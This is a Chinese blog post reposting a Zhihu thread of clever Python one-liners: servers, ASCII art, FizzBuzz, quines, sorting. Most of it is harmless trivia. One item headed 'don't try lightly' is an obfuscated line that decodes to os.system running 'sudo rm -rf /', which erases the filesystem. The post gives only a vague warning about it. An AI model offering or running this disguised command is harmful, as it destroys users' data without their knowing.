---
layout: post
title: 一行 Python 能实现什么丧心病狂的功能？
description: 摘抄自 [知乎](https://www.zhihu.com/question/37046157)
category: blog
---

转载自知乎 --- [一行 Python 能实现什么丧心病狂的功能？](https://www.zhihu.com/question/37046157)

#### 开启 HTTP 服务器

```
python -m SimpleHTTPServer 8000
```

或者是 Python 3 的

```
python3 -m http.server 8080
```

#### 开启 FTP 服务器

```
python -m pyftpdlib
```

允许 anonymous 匿名登录，密码随意。

#### 查看 Python 在线文档

Windows

```
python -m pydoc -p 8000
```

在本机 8000 端口建立一个 HTTP 服务器，可以查看本机的 Python 文档

Linux

```
pydoc -p 8000
```

#### 画一个心形

```
print'\n'.join([''.join([('LOVE'[(x-y)%4]if((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3<=0 else' ')for x in range(-30,30)])for y in range(15,-15,-1)])
```

![loveheart](/images/loveheart.png)

原理是心形曲线方程

```
(x²+y²-1)³+x²y³ = 0           		心形线

x²z³+9y²z³/80=(x²+9y²/4+z²-1)³      心形三维曲面

x²+y² = (2x²+2y²-x)²          		心形线

参数方程
x=a(2cost-cos2t)
y=a(2sint-sin2t)

极坐标方程
水平方向 r=a(1-cosθ) 或 r=a(1+cosθ) (a>0) 或 r=sin(θ/2)
垂直方向 r=a(1-sinθ)  或 r=a(1+sinθ) (a>0)

直角坐标方程
x²+y²+ax=a√(x²+y²)
x²+y²-ax=a√(x²+y²)

```

#### 画曼德布洛特集合（ Mandelbrot set）

 Mandelbrot 图像中的每个位置都对应于公式N=x+y*i中的一个复数

```
print '\n'.join([''.join(['*'if abs((lambda a:lambda z,c,n:a(a,z,c,n))(lambda s,z,c,n:z if n==0 else s(s,z*z+c,c,n-1))(0,0.02*x+0.05j*y,40)) < 2 else ' ' for x in range(-80,20)]) for y in range(-20,20)])
```

![MandelbrotSet](/images/MandelbrotSet.png)

#### 九九乘法表

```
print "\n".join(" ".join(["%s*%s=%-2s"%(y,x,x*y) for x in xrange(1,y+1)]) for y in xrange(1,10))
```

![ninemultinine](/images/ninemultinine.png)

#### 列表求频数

```
print (lambda x:{z:x.count(z) for z in set(x)} )("csdchbdsbcskdcjbdf")
```

```
{'c': 4, 'b': 3, 'd': 4, 'f': 1, 'h': 1, 'k': 1, 'j': 1, 's': 3}
```

#### 斐波那契数列

```
print [x[0] for x in [  (a[i][0], a.append((a[i][1], a[i][0]+a[i][1]))) for a in ([[1,1]], ) for i in xrange(100) ]]
```

```
[1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368, 75025, 121393, 196418, 317811, 514229, 832040, 1346269, 2178309, 3524578, 5702887, 9227465, 14930352, 24157817, 39088169, 63245986, 102334155, 165580141, 267914296, 433494437, 701408733, 1134903170, 1836311903, 2971215073L, 4807526976L, 7778742049L, 12586269025L, 20365011074L, 32951280099L, 53316291173L, 86267571272L, 139583862445L, 225851433717L, 365435296162L, 591286729879L, 956722026041L, 1548008755920L, 2504730781961L, 4052739537881L, 6557470319842L, 10610209857723L, 17167680177565L, 27777890035288L, 44945570212853L, 72723460248141L, 117669030460994L, 190392490709135L, 308061521170129L, 498454011879264L, 806515533049393L, 1304969544928657L, 2111485077978050L, 3416454622906707L, 5527939700884757L, 8944394323791464L, 14472334024676221L, 23416728348467685L, 37889062373143906L, 61305790721611591L, 99194853094755497L, 160500643816367088L, 259695496911122585L, 420196140727489673L, 679891637638612258L, 1100087778366101931L, 1779979416004714189L, 2880067194370816120L, 4660046610375530309L, 7540113804746346429L, 12200160415121876738L, 19740274219868223167L, 31940434634990099905L, 51680708854858323072L, 83621143489848422977L, 135301852344706746049L, 218922995834555169026L, 354224848179261915075L]
```

打印 1-100 之间的素数

```
print ' '.join([str(item) for item in filter(lambda x: not [x % i for i in range(2, x) if x % i == 0], range(2, 101))])
print ' '.join([str(item) for item in filter(lambda x: all(map(lambda p: x % p != 0, range(2, x))), range(2, 101))])
```

##### 八皇后问题

```
_=[__import__('sys').stdout.write("\n".join('.' * i + 'Q' + '.' * (8-i-1) for i in vec) + "\n===\n") for vec in __import__('itertools').permutations(xrange(8)) if 8 == len(set(vec[i]+i for i in xrange(8))) == len(set(vec[i]-i for i in xrange(8)))]
```

#### Quine

能够把自身代码打印出来的程序，叫做Quine

```
_='_=%r;print _%%_';print _%_
print(lambda x:x+str((x,)))('print(lambda x:x+str((x,)))',)
```


#### 快速排序算法

```
qsort = lambda arr: len(arr) > 1 and qsort(list(filter(lambda x: x <= arr[0], arr[1:]))) + arr[0:1] + qsort(list(filter(lambda x: x > arr[0], arr[1:]))) or arr
print qsort([12,43,54,23,14,243,54,13,43])
```
#### 一句话求解 2 的 1000 次方的各位数字之和

```
print sum(map(int, str(2**1000)))
```

#### 碾平list

```
a = [1, 2, [3, 4], [[5, 6], [7, 8]]]
flatten = lambda x: [y for l in x for y in flatten(l)] if type(x) is list else [x]
print flatten(a)
```

```
[1, 2, 3, 4, 5, 6, 7, 8]
```

其实有一个标准库也能实现同样的功能

```
>>> from compiler.ast import flatten
>>> flatten([1, 2, [3, 4], [[5, 6], [7, 8]]])
[1, 2, 3, 4, 5, 6, 7, 8]
```

#### 矩阵转置

```
zip(*[[1,2,3],[4,5,6],[7,8,9]])
```

```
[(1, 4, 7), (2, 5, 8), (3, 6, 9)]
```

#### 反重力飞翔

```
import antigravity
```

#### 一句话获得公网 IP

```
python -c "import socket; sock=socket.create_connection(('ns1.dnspod.net',6666)); print sock.recv(16); sock.close()"
```

前提是你要有公网 IP

#### FizzBuzz
打印数字1到100, 3的倍数打印“Fizz”来替换这个数, 5的倍数打印“Buzz”, 既是3又是5的倍数的打印“FizzBuzz”

```
print ' '.join(["fizz"[x % 3 * 4:]+"buzz"[x % 5 * 4:] or str(x) for x in range(1, 101)])
for i in range(1,101): print (lambda x: x[2] and "fizzbuzz" or x[1] and "buzz" or x[0] and "fizz" or i)(map(lambda x: x(i), [lambda x: x%3==0, lambda x: x%5==0, lambda x: x%5==0 and x%3==0])),
```

```
1 2 fizz 4 buzz fizz 7 8 fizz buzz 11 fizz 13 14 fizzbuzz 16 17 fizz 19 buzz fizz 22 23 fizz buzz 26 fizz 28 29 fizzbuzz 31 32 fizz 34 buzz fizz 37 38 fizz buzz 41 fizz 43 44 fizzbuzz 46 47 fizz 49 buzz fizz 52 53 fizz buzz 56 fizz 58 59 fizzbuzz 61 62 fizz 64 buzz fizz 67 68 fizz buzz 71 fizz 73 74 fizzbuzz 76 77 fizz 79 buzz fizz 82 83 fizz buzz 86 fizz 88 89 fizzbuzz 91 92 fizz 94 buzz fizz 97 98 fizz buzz
1 2 fizz 4 buzz fizz 7 8 fizz buzz 11 fizz 13 14 fizzbuzz 16 17 fizz 19 buzz fizz 22 23 fizz buzz 26 fizz 28 29 fizzbuzz 31 32 fizz 34 buzz fizz 37 38 fizz buzz 41 fizz 43 44 fizzbuzz 46 47 fizz 49 buzz fizz 52 53 fizz buzz 56 fizz 58 59 fizzbuzz 61 62 fizz 64 buzz fizz 67 68 fizz buzz 71 fizz 73 74 fizzbuzz 76 77 fizz 79 buzz fizz 82 83 fizz buzz 86 fizz 88 89 fizzbuzz 91 92 fizz 94 buzz fizz 97 98 fizz buzz
```

#### 不要轻易尝试

```
(lambda _: getattr(__import__(_(28531)), _(126965465245037))(_(9147569852652678349977498820655)))((lambda ___, __, _: lambda n: ___(__(n))[_ << _:-_].decode(___.__name__))(hex, long, True))
```

#### Python 之禅

最后以 Python 之禅结尾

```
import this
```

```
The Zen of Python, by Tim Peters

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!
```


### 参考链接

[一行 Python 能实现什么丧心病狂的功能](https://www.zhihu.com/question/37046157) <br>
[以撸代码的形式学习Python](https://github.com/xianhu/LearnPython/blob/master/python_oneline.py) <br>
[Python One-liner Games](http://arunrocks.com/python-one-liner-games/) <br>
[ 一行python代码](http://blog.csdn.net/wireless_com/article/details/52713868) <br>
